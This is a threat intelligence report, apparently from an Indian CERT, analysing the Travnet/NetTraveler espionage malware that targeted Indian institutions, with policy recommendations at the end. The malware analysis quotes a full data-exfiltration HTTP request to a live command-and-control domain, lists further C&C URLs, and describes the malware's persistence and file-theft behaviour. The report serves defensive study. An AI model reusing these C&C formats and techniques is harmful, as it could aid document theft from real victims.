The objective of this report is the following :  An overview of malware distribution in Indian Cyberspace  Detailed , in-depth technical analysis of Advanced Persistent Threat ( APT ) actors against India  Enumerate the primary technical causes leading to successful attacks  Recommendations to improve and protect the overall Critical Information Infrastructuren CERT-ISAC is India 's first Independent CERT for mobile and electronic security . 
Established by the non-profit scientific foundation `` Information Sharing and Analysis Center '' ( ISAC ) that manages the National security Database ( NSD ) program , CERT-ISAC has a dedicated 30 seat threat intelligence monitoring center at New Delhi and Mumbai to monitor constant threats and attacks on the India Cyber Space . 
CERT-ISAC has numerous security experts from the National Security Database program who regularly support the research initiatives . 
`` Po '' is an advanced behavior based mobile anti-virus designed by the organization Research Bunble , especially for the defence . 
The Po Engine is currently used by CERT-ISAC for malware analysis and certification of mobile apps for security and privacy . 
www.ResearchBundle.com The recent 'Operation Hangover ' report from Norman 's Malware Detection Team has projected India as an emerging APT actor . 
The report goes on to document a detailed analysis of targeted malware and lists a small number of Indian-based companies that were potentially threat actors involved in the campaign . 
While the 'Hangover ' report itself has been widely debated in the Indian Information Security community , there is little proof , beyond circumstantial evidence provided in the Norman report , that Indian actors were behind this APT campaign , and the larger concern remains that India is the victim of numerous APT campaigns , rather than an instigator of this threat . 
As our Government is rapidly migrating towards e-governance , it is vital to ensure a robust approach to data security is implemented from an early stage to prevent misuse and subsequent attacks on critical infrastructure and the national economy . 
A quick look at India 's history with respect to battling cyber threats , reveals an age- old & on-going war between the `` hackers '' from various Nations . 
Defacement of Indian government sites date back to the year 2003 & even today , they continue to happen . 
In this report , we analyse the various facts and provide in-depth analysis of an `` Advanced persistent threat '' attack on India that makes us ask – Are we the hunter or the hunted ?  Part one – Hunter or the Hunted ?  Part two – Advanced persistent threat - analysis  Part three - Primary Causes  Part four - Recommendations '' Advanced persistent threat '' or APT as it is known , is a reality today . 
Unlike the regular script-kiddie attacks that are carried out usually for fun or for fame , APTs are serious campaigns , undertaken by groups with a variety of skill-sets . 
The focus of an APT campaign usually is to gather valuable information against specific companies / organizations or selected sectors of a country . 
These usually begin with highly targeted spear-phishing attacks . 
Out of 25,935 websites scanned by Google , 14 % websites were infected by Malware . 
AS = Attack Sites To make some sense of the current scenario of cyber security in India , let 's have a look at some of the statistics published by CERT-India . 
The following table should give us a good idea of how things are shaping up . 
It 's not surprising to note that the threats are increasing at an alarming rate , year after year . 
In a way , it's heartening to observe the CERT evolve & rise upto newer challenges & latest threats . 
Unfortunately , it 's not enough . 
The reports submitted by CERT do not take into account the most fundamental aspects of maintaining a state of secure IT environment . 
This fact is evident from the number of security incidents that happen over an year & how the right authorities react to them . 
If every reported incident was handled properly by identifying the root cause , followed by a full security audit , we wonder if the numbers would grow so fast . 
As mentioned earlier , cases of government sites being defaced date back to 2003 . 
Even today , one can find servers running older & vulnerable versions of software , poor server management , web applications deployed on these servers being designed & implemented by programmers who lack awareness of secure coding practices , to name a few . 
The private sector though , is much more cautious & alert when it comes to their IT infrastructure compared to the government . 
Let 's analyse the state of government 's IT infrastructure in the following pages . 
While the statistics presented by CERT-In looks alarming by itself , the actual state of domains that end with '' gov.in '' , is much worse . 
A quick look at the following recent screenshot of www.zone-h.org site provides some shocking insight . 
According to the site , the current statistics are as follows : Total Notifications : 1299 Mass defacements : 753 A recent incident that caught our attention was the `` Travnet '' case . 
We carried out a preliminary analysis of our own on the subject . 
Kaspersky as well as McAfee amongst others , have published detailed analysis of the malware & the campaign . 
Our focus was to understand the nature of the group behind the attack & its agenda . 
It began with Kaspersky's revelation of the attack . 
We recommend you to go through Kaspersky & McAfee 's analysis of the malware to know more about the spear phishing campaign & the exploits used . 
Our analysis is currently focussed only on the malware samples that are dropped on the target systems , as the exploits used during the spear-phishing campaign are older & already patched by the respective vendors . 
To summarize the modus operandi of the attack , targeted phishing mails were sent to individuals , having Office documents as attachments . 
These documents exploited previously known vulnerabilities ( CVE-2012-0158 and CVE-2010-3333 ) to drop `` Travnet '' malware onto the systems . 
Its fascinating to note that the attachments that were sent to Indian targets were carefully selected & some of them were named as follows :  `` Army Cyber Security Policy 2013.doc ''  `` Jallianwala bagh massacre a deeply shameful act.doc ''  `` Report - Asia Defense Spending Boom.doc ''  `` His Holiness the Dalai Lama 's visit to Switzerland day 3.doc ''  `` BJP wo n't dump Modi for Nitish NDA headed for split.doc '' As its evident , the group behind the attack obviously has done extensive research on topics that are current as well as intriguing to the Indian targets . 
We managed to acquired 2 variants of the `` Travnet '' malware & our analysis of the same is as follows . 
File details : A quick analysis by PEiD reveals that the binary is not packed or protected . 
It begins by creating a new mutex object , named `` INSTALL SERVICES NOW ! '' . 
Next step is to create a configuration file named `` config_t.dat '' in the windows ' `` system '' folder . 
It then populates it with the right parameters , after decoding them . 
After the configuration file is written , it checks if the malware was previously installed or not , if not , it creates a dynamic-link library in the `` system32 '' folder , creates a temporary batch file named as `` temp.bat '' which installs the previous DLL as a service on the system . 
The name of the DLL that is created , is based upon the values of the data from `` netsvcs '' from the following registry key : `` HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost '' . 
During this runtime , it turned out to be `` 6to4ex.dll '' but it can change from runtime to runtime.The malware then deletes the batch file . 
Its obvious that this executable basically acts as a dropper . 
The contents of the batch file & the configuration file generated are as follows . 
Batch file : temp.bat Configuration file : config_t.dat Next section focuses on the analysis of the DLL ( `` 6to4ex.dll '' ) that was dropped by this executable . 
Analysis of `` 6to4ex.dll '' File Details A quick analysis by PEiD reveals that the binary is not packed or protected . 
Now , as we know already , this DLL was installed as a service by the previous dropper . 
Analysis of the '' ServiceMain '' function of the DLL throws light on many interesting things . 
The first thing it does upon execution is to create a new mutex object named `` NetTravler Is Running ! '' . 
Its usually done to avoid running multiple instances of the same malware . 
Next , it reads the configuration file . 
Additionally , it also creates few interesting files in the `` system32 '' folder . 
The filenames are quite indicative of what their contents might be . 
`` enumfs.ini '' as the name suggests , is a complete list of all files and folders on the computer . 
`` dnlist.ini '' seems to be noting down the date & time . 
`` system_t.dll '' on the other hand , contains a broad category of sensitive information about the computer like the `` Computer Name '' , Windows version , IP address , list of running processes , network information & so on . 
The contents of the files are as follows Filename : `` system_t.dll '' Upon proper character encoding & use of google 's Translate feature , it turns out to be `` Chinese '' . 
Filename : `` enumfs.ini '' Filename : `` dnlist.ini '' Another interesting aspect of Travnet is that it can specifically search for files of the type `` doc , docx , xls , xlsx , txt , rtf , pdf '' on the victim machine . 
This provides enough hint that this malware was designed to steal confidential information unlike the usual botnet variants that focus primarily on providing remote access to the system or to act as zombies for launching DDOS attacks . 
To summarize , the Travnet malware initially collects system information , a list of files on the victim machine among others , then sends this data to the remote Command & Control ( C & C ) server , by using custom compression & encoding functions . 
The malware creates a new file with the naming convention as follows : '' travlerbackinfo- % d- % d- % d- % d- % d.dll '' , where the signed integer values are replaced by the current system date & time , copies the content of `` system_t.dll '' into it & then , uploads it to the C & C . 
It also uploads the list of files found on the victim machine , which was saved in the `` enumfs.ini '' file to the remote server , by copying its contents to a new file , named following this format : `` FileList- % 02u % 02u- % 02u % 02u % 02u.ini '' It does n't stop at that , it even uploads the victim 's files onto the remote C & C that have the file extensions `` doc , docx , xls , xlsx , txt , rtf , pdf '' as well as the files on the victim 's desktop folder . 
Another important aspect of Travnet is the fact that it uses a custom compression & encoding algorithm on the data collected , before its sent to the remote C & C . 
A typical file upload communication between the bot & the C & C looks like this : An actual HTTP GET request looks like this : '' http : //www.newesyahoo.com/traveler1/net/nettraveler.asp ? hostid=00CD1A40 & hostname=ComputerName & ho stip=127.0.0.1 & filename=FileList-0523- 131103.ini & filestart=0 & filetext=begin : :RgAxAC2QzebTgdToZTkXQaCicYTaZR72HWSigYTPHjEZDUZTvgBrOEmQ0 nIxm86m46D0YTg* : :end '' Here , the data between `` begin : : '' & `` : :end '' is the actual file content , that was compressed & encoded by the bot . 
It seems that this older variant of the Travnet malware supported 4 different types of commands from the remote C & C and they are as follows :  UNINSTALL  UPDATE  RESET  UPLOAD That concludes Part-A of our Travnet analysis . 
File details : A quick analysis by PEiD reveals that the binary is not packed or protected . 
This executable is apparently an updated variant of Travnet . 
The major changes are as follows :  It 's an executable & not a DLL . 
 The compression algorithm has been modified . 
 It tries to install itself on the victim machine to achieve persistence instead of dropping other payloads . 
 Supports just 2 instructions from the C & C instead of 4 , like in the previous version . 
Apart from these , there is n't much difference . 
The following analysis only focuses on what has changed . 
It achieves persistence by copying itself to the currently logged-in user 's `` temp '' folder as `` csmss.exe '' & placing a shortcut to it , named as `` seruvice.lnk '' in the `` startup '' folder . 
The next step it to create a new mutex object to avoid running multiple instances . 
It names the mutex as '' Assassin '' . 
After this , it generates a unique 8 characters long `` hostid '' , based on volume serial number to identify the bot . 
This is common to the previous variant too . 
Then it checks if the victim machine is connected to the internet or not , by trying to resolve `` smtp.live.com '' & if that fails , as a second attempt , `` smtp..yahoo.com '' . 
The strings displayed above , are actually in `` Chinese '' & turn out to be :  `` You can connect to the network . 
''  `` Unable to connect to the network . 
'' Unlike the previous variant , this one does n't seem to collect sensitive information about the victim machine . 
It just makes a list of all files & folders on the victim machine & dumps it into a file named as '' AllIndex.ini '' . 
Next step is to compress the contents of this file , copy the compressed content to a new file named as `` AllIndex.ini_d '' & then delete the previously created clear-text file . 
The contents of both the files are as follows : Filename : AllIndex.ini Filename : AllIndex.ini_d It 's pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following image : Apart from that , this variant also creates a file that lists all the currently running processes on the victim machine , into a text file named `` Process.dll '' inside the currently logged-on user 's `` temp '' folder . 
This variant also uses a modified naming convention to upload files onto the remote C & C . 
The only other major difference from the previous variant is the fact that this one only supports 2 commands from the remote C & C server , instead of 4 & they are as follows :  Uninstall  Upload The C & C server in case of this variant was located at : `` http : //www.viprambler.com/newsinfo/uld/nettraveler.asp '' Apart from analyzing the malware samples , we also tried to gather as much information about the C & C servers as we could . 
The fact that even after a lot of research papers being published on the analysis of the Travnet malware , some of the C & C servers are still active & functioning , is noteworthy . 
We were able to locate a few of them . 
The ones that caught our attention are currently hosted on these domains :  www.pkspring.net  www.viprambler.com Let 's start with the analysis of `` www.viprambler.com '' . 
WHOIS record for the domain currently is as follows : Registrant information for the domain is as follows : Our analysis strongly suggests that the group behind Travnet might be from China . 
The above record is just one of the findings that supports the claim . 
Its interesting to note that the domain was recently registered , is locked & expires in 2014 . 
Another interesting observation is the address of the registrant . 
`` Guangdong '' province from China seems to pop up everywhere . 
Its also noteworthy that the domain is still active & still hosting the Travnet C & C . 
We 've also observed that the C & C now remains active only during specific time of the day . 
The time-stamp from the images below , confirms this . 
Active response from the C & C : C & C server refusing connection later on the same day : Its obvious that even after the discovery of the malware , the group behind this specific attack is determined to keep it alive . 
The Travnet malware as well as its C & C infrastructure is constantly evolving . 
Lets move onto the next active domain . 
The Travnet C & C hosted at `` pkspring.net '' seems to be fully functional & active all the time . 
The response from the server when opened from a browser is as follows : Another interesting finding is the fact that it hosts Travnet C & C on 3 different ports on the server . 
They are as follows :  80  443  8080 Its evident from the following pictures . 
Port 443 Port 8080 Moving on , we found out that 21 domains are hosted on the same server at the moment . 
And all of them are active C & C servers for the Travnet malware . 
They also seem to have interesting domain names . 
Its an indication of the seriousness of the campaign . 
Other domains hosted & owned by the same group on the same server/IP : The image below proves that all of the above domains serve the same Travnet C & C on the same 3 ports , each . 
After this , we focused our attention on the WHOIS details of these domains . 
At the moment , the details of the registrant is kept private & it was recently updated . 
Its also interesting to note that the group behind this has ensured that the domain can not be taken over by someone else . 
The following page contains the current WHOIS data for the domain . 
`` Pkspring.net '' WHOIS data ( Recent ) Registrant details for the domain : Nothing much to go on there at the moment . 
But thanks to older WHOIS records , we found out some interesting facts . 
The same domain was earlier registered as follows : It was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013 . 
The registrant's information at that time was as follows : The above data seems familiar . 
The only difference now being that the domains have be renewed , registration details kept private & the email ID of the registrant has changed from `` livep92 @ hotmail.com '' to '' chenjm @ sina.com '' , which belongs to a private Chinese mail service ( http : //mail.sina.com.cn/ ) . 
The same thing has happened with other publicly disclosed Travnet C & C domains . 
We also fetched details of another domain that previously hosted Travnet C & C & has been recently renewed , most likely by the same group . 
A search for the email `` livep92 @ hotmail.com '' led us to the following page : The above listed domains are already known to have hosted the Travnet C & C . 
We did some research on the current status of one of the domains from the above list , `` discoverypeace.org '' . 
The current WHOIS data for the domain `` discoverypeace.org '' is as follows : This looks strikingly similar to the current status of the active C & C domain `` pkstring.net '' . 
It was also recently updated . 
The older WHOIS entry for the same domain was as follows : From our analysis of the Travnet malware so far , it 's quite evident that many things hint at the origin of this campaign to be from China . 
It 's also a known fact the Indian government & other important sectors from India were heavily targeted during this campaign . 
T The fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive information makes it noteworthy . 
What are the primary causes of weak Indian Cyber Space ? Another interesting finding is the fact that many of the servers that host `` gov.in '' sites are running outdated software versions . 
As an example , from the above image , it is evident that the domain `` karnataka.gov.in '' is hosted on a server running '' Windows Server 2003 '' , on 22-June-2013 . 
To confirm this , we ran an nmap scan & it 's not surprising to find out that the information is true . 
The screenshot of our nmap scan is as follows : While use of outdated software is one of the major concerns , it seems most of the Indian government sites are riddled with vulnerable code too . 
It 's quite common to locate webshells on these sites . 
One of the many live webshells we found recently during our analysis is shown in the following image : From the time-stamps on the above image , it 's evident that this is webshell is still active at the time of this this writing . 
An example of a government site that 's not properly managed & discloses highly sensitive information is as follows : The above screenshot is just one of the many live examples of poorly managed web servers that do not follow even the most basic web application security guidelines . 
Even important government sites , access to which can lead to much deeper intrusion seem to be managed with little care . 
The following image is just one of the examples of developing or customizing a CMS & not properly handling access-control . 
While defacements are usually carried out by hackers just for fun or fame , in a way its a boon in disguise . 
Serious hackers can cause much more damage & remain unnoticed for a very long time by having access to the privileges these hackers abuse to deface the site . 
Slowly but steadily , serious APT campaigns are on the rise . 
Its very important for the nation to start upgrading its IT infrastructure & keep up with the latest security guidelines & practices . 
The next part of this research paper focuses on a recent APT campaign against multiple countries including India was targeted . 
While each and every technical cause for weak Indian Cyber space is beyond the scope of this document , we also believe that India requires a strong policy driven approach along with inspiring leadership from thought leaders and Government departments in Information security to bring the much needed change . 
We recommend the following The Domain name acquisition , management and maintenance policy should address the process to protect and manage the crucial online identities of Indian Government Domains . 
At present there is no consistent policy to acquire and manage the domains . 
The policy should address : 1 . 
Naming convention to be followed for official Government domains to prevent misuse by domain squatters 2 . 
A Government body that is responsible to register , administer and manage the domains 3 . 
Consistent working administrative and management contacts for WHOIS query 4 . 
Systematic policy to acquire domains and renew them on timely basis 5 . 
A policy to ensure `` Domain Authorization keys '' are managed properly and maintained in proper chain of custody , secured in a bank locker and handled with systematic process It is crucial to select the right vendors for developing security websites and web applications for all Government projects . 
The policy should address : 1 . 
Qualification parameters for selection of vendor for web site and web application development 2 . 
Certified Staff by vendor working on Government projects for Information security and secure coding 3 . 
Quarterly vulnerability assessment and penetration testing of all websites 4 . 
Security Classification of websites that determine parameters of vendor approval 5 . 
Comprehensive development and support contract from vendor that covers data security and associated penalties in event of breach While it is possible that such a policy exits with organizations such as NIC , it is important to ensure these are implemented in a timely manner . 
The policy on patch management must ensure outdated software must be secured appropriately and updated as per Industry standards . 
The policy must address : 1 . 
Adequate test bed environment for testing new updates for software , patches etc 2 . 
Comprehensive UAT ( User Acceptance Testing ) before implementation of critical security patches 3 . 
Policy to ensure critical security updates are deployed within a specified time from date of release 4 . 
Backup of data and roll back methodologies in event of patch deployment issues 5 . 
Monitoring of critical updates and patches and appropriate classification of the same for deployment India has a strong community of Information security experts who can support the Indian Government and strengthen overall security of our cyber space . 
As the nature of such community is dynamic and rapidly evolving , it is important for the Indian Government to setup a policy and process for responsible full disclosures when Indian citizens report possible vulnerabilities in critical digital assets of India . 
These must address : 1 . 
Process by which any citizen of India can safely submit and report vulnerabilities , full disclosures in Indian websites to an authorized agency without fearing action of IT Act law 2 . 
Guidelines under which , the security experts from the Indian community can communicate , assist and support law enforcement and responsible agencies in effectively addressing security gaps in Indian Cyber space . 
3 . 
Process to act on security incidents reported by the security community in a timely manner . 
4 . 
Guidelines to industry at large on how to cooperate with security experts who disclose security issues in their organizations 5 . 
Guidelines to the citizens on being Cyber aware and how to help the Government in securing the economy of the country from malicious hackers National Security Database ( NSD ) is a prestigious empanelment program awarded to credible & trustworthy Information security experts with proven skills to protect the National Critical Infrastructure & economy of the country . 
The National Security Database project has been generously endorsed and supported by NTRO and CERT and has been playing an important role in raising the cyber safety awareness across the Nation as well as engaging the community in improving the overall cyber space of India . 
We sincerely believe that in coming years , the program will create a strong and credible cyber workforce that can help the Indian Government in both offense and defence of its Cyber Space .
